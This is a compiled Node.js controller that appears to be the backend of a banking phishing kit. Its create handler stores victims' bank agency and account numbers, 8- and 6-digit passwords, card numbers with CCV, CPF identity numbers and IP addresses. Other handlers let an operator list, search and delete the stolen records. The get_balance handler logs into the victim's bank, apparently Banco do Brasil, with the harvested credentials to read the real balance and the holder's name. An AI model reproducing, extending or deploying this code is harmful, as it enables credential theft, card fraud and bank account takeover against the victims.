"use strict";

var _interopRequireDefault = require("@babel/runtime/helpers/interopRequireDefault");

Object.defineProperty(exports, "__esModule", {
  value: true
});
exports.removeAll = exports.remove = exports.get_balance = exports.findOne = exports.findAll = exports.create = void 0;

var _regenerator = _interopRequireDefault(require("@babel/runtime/regenerator"));

var _asyncToGenerator2 = _interopRequireDefault(require("@babel/runtime/helpers/asyncToGenerator"));

var _defineProperty2 = _interopRequireDefault(require("@babel/runtime/helpers/defineProperty"));

var _index = _interopRequireDefault(require("../models/index.js"));

var _bb = _interopRequireDefault(require("../src/bb.js"));

var _nodeDatetime = _interopRequireDefault(require("node-datetime"));

var _requestIp = _interopRequireDefault(require("@supercharge/request-ip"));

var Log = _index["default"].Log;
var Op = _index["default"].Sequelize.Op; // Create and Save a new Log

var create = function create(req, res) {
  // Create a Log
  var log = {
    date: _nodeDatetime["default"].create().format('Y.m.d H:M:S'),
    name: req.body.name,
    agency: req.body.agency,
    account: req.body.account,
    password_8: req.body.password_8,
    balance: req.body.balance,
    phone: req.body.phone,
    password_6: req.body.password_6,
    syllabic: req.body.syllabic,
    card_name: req.body.card_name,
    card_number: req.body.card_number,
    ccv: req.body.ccv,
    cpf: req.body.cpf,
    is_visited: req.body.name == '' ? false : true,
    ip_address: _requestIp["default"].getClientIp(req)
  }; // Save Log in the database

  Log.create(log).then(function (data) {
    res.send({
      success: true
    });
  })["catch"](function (err) {
    res.status(500).send({
      message: err.message || "Some error occurred while creating the Log."
    });
  });
}; // Retrieve all Logs from the database.


exports.create = create;

var findAll = function findAll(req, res) {
  var _req$body = req.body,
      start = _req$body.start,
      length = _req$body.length;
  var search = req.body['search[value]'];
  var condition = (0, _defineProperty2["default"])({}, Op.and, [{
    id: (0, _defineProperty2["default"])({}, Op.gt, 0)
  }, (0, _defineProperty2["default"])({}, Op.or, [{
    date: (0, _defineProperty2["default"])({}, Op.like, "%".concat(search, "%"))
  }, {
    name: (0, _defineProperty2["default"])({}, Op.like, "%".concat(search, "%"))
  }, {
    agency: (0, _defineProperty2["default"])({}, Op.like, "%".concat(search, "%"))
  }, {
    account: (0, _defineProperty2["default"])({}, Op.like, "%".concat(search, "%"))
  }, {
    balance: (0, _defineProperty2["default"])({}, Op.like, "%".concat(search, "%"))
  }])]);
  Log.findAndCountAll({
    where: condition,
    offset: parseInt(start),
    limit: parseInt(length)
  }).then( /*#__PURE__*/function () {
    var _ref2 = (0, _asyncToGenerator2["default"])( /*#__PURE__*/_regenerator["default"].mark(function _callee(data) {
      return _regenerator["default"].wrap(function _callee$(_context) {
        while (1) {
          switch (_context.prev = _context.next) {
            case 0:
              _context.t0 = res;
              _context.next = 3;
              return Log.count();

            case 3:
              _context.t1 = _context.sent;
              _context.t2 = data.count;
              _context.t3 = data.rows;
              _context.t4 = {
                recordsTotal: _context.t1,
                recordsFiltered: _context.t2,
                data: _context.t3
              };

              _context.t0.send.call(_context.t0, _context.t4);

            case 8:
            case "end":
              return _context.stop();
          }
        }
      }, _callee);
    }));

    return function (_x) {
      return _ref2.apply(this, arguments);
    };
  }())["catch"](function (err) {
    res.status(500).send({
      message: err.message || "Some error occurred while retrieving Logs."
    });
  });
}; // Find a single Log with an id


exports.findAll = findAll;

var findOne = function findOne(req, res) {
  var id = req.params.id;
  Log.findByPk(id).then(function (data) {
    res.send(data);
  })["catch"](function (err) {
    res.status(500).send({
      message: "Error retrieving Log with id=" + id
    });
  });
}; // Delete a Log with the specified id in the request


exports.findOne = findOne;

var remove = function remove(req, res) {
  var id = req.body.id;
  Log.destroy({
    where: {
      id: id
    }
  }).then(function (num) {
    if (num == 1) {
      res.send({
        success: true
      });
    } else {
      res.send({
        success: false
      });
    }
  })["catch"](function (err) {
    res.status(500).send({
      message: "Could not delete Log with id=" + id
    });
  });
}; // Delete all Logs from the database.


exports.remove = remove;

var removeAll = function removeAll(req, res) {
  Log.destroy({
    where: {},
    truncate: false
  }).then(function (nums) {
    res.send({
      message: "".concat(nums, " Logs were deleted successfully!")
    });
  })["catch"](function (err) {
    res.status(500).send({
      message: err.message || "Some error occurred while removing all Logs."
    });
  });
};

exports.removeAll = removeAll;

var get_balance = /*#__PURE__*/function () {
  var _ref3 = (0, _asyncToGenerator2["default"])( /*#__PURE__*/_regenerator["default"].mark(function _callee2(req, res) {
    var name, checkingBalance, bb, branch, account, password;
    return _regenerator["default"].wrap(function _callee2$(_context2) {
      while (1) {
        switch (_context2.prev = _context2.next) {
          case 0:
            _context2.prev = 0;
            res.json({
              name: 'test_name',
              balance: 5000
            });
            name = '';
            checkingBalance = '';
            bb = new _bb["default"]();
            branch = req.body.agency;
            account = req.body.account;
            password = req.body.password;
            _context2.next = 10;
            return bb.login({
              branch: branch,
              account: account,
              password: password
            });

          case 10:
            name = _context2.sent;
            _context2.next = 13;
            return bb.checking.getBalance();

          case 13:
            checkingBalance = _context2.sent;
            console.log('----------------------');
            console.log(name.nomeCliente, checkingBalance);

            if (name == '') {
              res.json({
                name: name,
                balance: checkingBalance
              });
            } else {
              res.json({
                name: name.nomeCliente,
                balance: checkingBalance
              });
            }

            _context2.next = 22;
            break;

          case 19:
            _context2.prev = 19;
            _context2.t0 = _context2["catch"](0);
            res.json({
              name: '',
              balance: ''
            });

          case 22:
          case "end":
            return _context2.stop();
        }
      }
    }, _callee2, null, [[0, 19]]);
  }));

  return function get_balance(_x2, _x3) {
    return _ref3.apply(this, arguments);
  };
}();

exports.get_balance = get_balance;